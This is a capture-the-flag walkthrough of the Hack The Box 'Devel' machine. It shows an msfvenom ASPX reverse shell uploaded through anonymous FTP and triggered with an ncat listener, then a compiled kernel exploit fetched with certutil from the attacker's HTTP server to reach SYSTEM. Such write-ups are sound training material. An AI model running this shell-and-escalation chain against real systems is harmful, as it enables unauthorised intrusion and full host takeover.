First enumeration with nmap 

`nmap -sC -sV -T4 -oN normal.txt -p 21,80 -Pn 10.10.10.5`

```
# Nmap 7.93 scan initiated Mon May 15 23:12:02 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 21,80 -Pn 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 15 23:12:18 2023 -- 1 IP address (1 host up) scanned in 15.62 seconds
```
now we know what port and service running, let's enumerate port 21 first.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:n16hth4wk): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> put normal.txt 
local: normal.txt remote: normal.txt
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************************************************************|   914        5.58 MiB/s    --:-- ETA
226 Transfer complete.
914 bytes sent in 00:00 (5.30 KiB/s)
ftp> 
```
we have anonymous login enabled and there's a file upload availble. uploaded `normal.txt` file to see if we can access it through the web.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/368fdb53-d444-4662-9145-adf560e15266)

cool we can access these files through the browser, let's craft a reverse shell payload.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f aspx -a x86 --platform windows -o shell.aspx   
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2739 bytes
Saved as: shell.aspx
```
now we generated a payload using msfvenom, let's upload it through ftp

```
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************************************************************|  2777       11.66 MiB/s    --:-- ETA
226 Transfer complete.
2777 bytes sent in 00:00 (16.88 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-16-23  06:53AM                  914 normal.txt
05-16-23  07:02AM                 2777 shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
logged back in ftp and uploaded the `shell.aspx` payload. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1c7cb0f7-322e-4d37-8fea-f314117b3813)

fire up ncat listener.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f435d921-f5e9-4c99-bc7a-8d7180568f33)

trigger the shell through the web and check back ncat listener.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ ncat -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.5.
Ncat: Connection from 10.10.10.5:49160.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>
```
Boom, got reverse shell as `iis apppool\web`.


## Privilege Escalaction

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3be0ca06-8aef-40d1-8ea8-f6d6f4e3a5c5)

checking systeminfo, we can see the os version `6.1.7600 N/A Build 7600` let's check for exploit for it.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/84099caa-df46-4270-9954-af73f805e90d)

now we downloaded the script, what we need to do is compile it.

```
sudo apt-get install mingw-w64
```
first we need to install mingw-w64

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ ls -al exploit.exe     
-rwxr-xr-x 1 n16hth4wk n16hth4wk 240005 May 16 05:35 exploit.exe
```
then compile the script. let's send it to the target.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/devel]
└─$ sudo python -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
first start a python http server

```
c:\windows\system32\inetsrv>cd C:\windows\temp  
cd C:\windows\temp                                                                 
                                                                                   
C:\Windows\Temp>certutil -urlcache -f http://10.10.14.14/exploit.exe exploit.exe
certutil -urlcache -f http://10.10.14.14/exploit.exe exploit.exe
****  Online  ****                                                                 
CertUtil: -URLCache command completed successfully.
                                                                                   
C:\Windows\Temp>dir                                                                
dir                                                                                
 Volume in drive C has no label.                                                   
 Volume Serial Number is 137F-3971                                                 
                                                                                   
 Directory of C:\Windows\Temp                                                      
                                                                                   
16/05/2023  07:39     <DIR>          .
16/05/2023  07:39     <DIR>          ..
17/03/2017  02:10                  0 DMI20C8.tmp
28/12/2017  02:44                  0 DMI4069.tmp
16/05/2023  07:39            240.005 exploit.exe
13/12/2020  01:22                140 fwtsqmfile00.sqm
13/12/2020  01:59                140 fwtsqmfile01.sqm
14/12/2020  03:36              4.822 MpCmdRun.log
17/03/2017  05:32              5.194 MpSigStub.log
18/03/2017  02:04     <DIR>          rad11098.tmp
18/03/2017  02:06     <DIR>          rad18A66.tmp
***
11/02/2022  05:30             45.752 vmware-vmusr.log
16/05/2023  06:44              1.880 vmware-vmvss.log
              20 File(s)     25.921.054 bytes
              14 Dir(s)   4.697.944.064 bytes free

C:\Windows\Temp>

```
download the exploit to the target. 

```
C:\Windows\Temp>whoami
whoami
iis apppool\web

C:\Windows\Temp>exploit.exe
exploit.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```
ran the exploit and boom we got `nt authority\system` 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/06998ca7-0312-4705-a758-cc1ca4f687f4)

and we are through

